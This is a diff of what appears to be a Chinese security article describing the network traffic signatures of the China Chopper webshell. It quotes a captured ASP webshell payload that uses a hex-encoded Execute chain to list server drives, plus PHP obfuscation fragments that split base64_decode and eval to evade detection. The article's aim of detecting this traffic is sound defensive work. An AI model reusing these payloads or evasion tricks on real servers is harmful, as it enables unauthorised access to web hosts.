@@ -65,15 +65,16 @@ i=A&z0=GB2312
     
     caidao=Execute("Execute(""On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):Execute(""""On Error Resume Next:""""&bd(""""44696D20533A533D5365727665722E4D61707061746828222E2229266368722839293A53455420433D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A496620457272205468656E3A4572722E436C6561723A456C73653A466F722045616368204420696E20432E4472697665733A533D5326442E44726976654C657474657226636872283538293A4E6578743A456E642049663A526573706F6E73652E5772697465285329"""")):Response.Write(""""|<-""""):Response.End"")")
 
-其中特征点有如下三部分，
-第一：“Execute”，Execute函数用于执行传递的攻击payload，这是必不可少的，这个等同于php类中eval函数；
-第二：OnError ResumeNext，这部分是大部分ASP客户端中必有的流量，能保证不管前面出任何错，继续执行以下代码。
-第三：Response.Write和Response.End是必有的，是来完善整个操作的。
-这种流量主要识别这几部分特征，在正常流量中基本没有。
+其中特征点有如下三部分，<br>
+第一：“Execute”，Execute函数用于执行传递的攻击payload，这是必不可少的，这个等同于php类中eval函数；<br>
+第二：OnError ResumeNext，这部分是大部分ASP客户端中必有的流量，能保证不管前面出任何错，继续执行以下代码。<br>
+第三：Response.Write和Response.End是必有的，是来完善整个操作的。<br>
+这种流量主要识别这几部分特征，在正常流量中基本没有。<br>
 
-注：OnError Resume Next这个特征在大部分流量中存在，极少数情况没有。
+注：OnError Resume Next这个特征在大部分流量中存在，极少数情况没有。<br>
 
 中国菜刀2016版本各语言WebShell链接流量特征
+
 PHP类WebShell链接流量
 
     POST /webshell.php HTTP/1.1
@@ -92,11 +93,11 @@ PHP类WebShell链接流量
 
 这个版本中流量最大的改变就是将特征进行打断混淆，这也给我们识别特征提供一种思路。
 
-其中特征点有如下三部分，
-第一：“"Ba"."SE6"."4_dEc"."OdE”，这部分是将base64解码打断使用.来连接。
-第二：@ev"."al，这部分也是将@eval这部分进行打断连接，可以识别这段代码即可。
-第三：QGluaV9zZXQoImRpc3BsYXlf...，该部分是传递攻击payload，payload依旧使用Base64编码的，所以可以利用base64解码可以看到攻击明文来识别。
-注：1.有少数时候eval方法会被assert方法替代。
+其中特征点有如下三部分，<br>
+第一：“"Ba"."SE6"."4_dEc"."OdE”，这部分是将base64解码打断使用.来连接。<br>
+第二：@ev"."al，这部分也是将@eval这部分进行打断连接，可以识别这段代码即可。<br>
+第三：QGluaV9zZXQoImRpc3BsYXlf...，该部分是传递攻击payload，payload依旧使用Base64编码的，所以可以利用base64解码可以看到攻击明文来识别。<br>
+注：1.有少数时候eval方法会被assert方法替代。<br>
 
 JSP类WebShell链接流量：
 
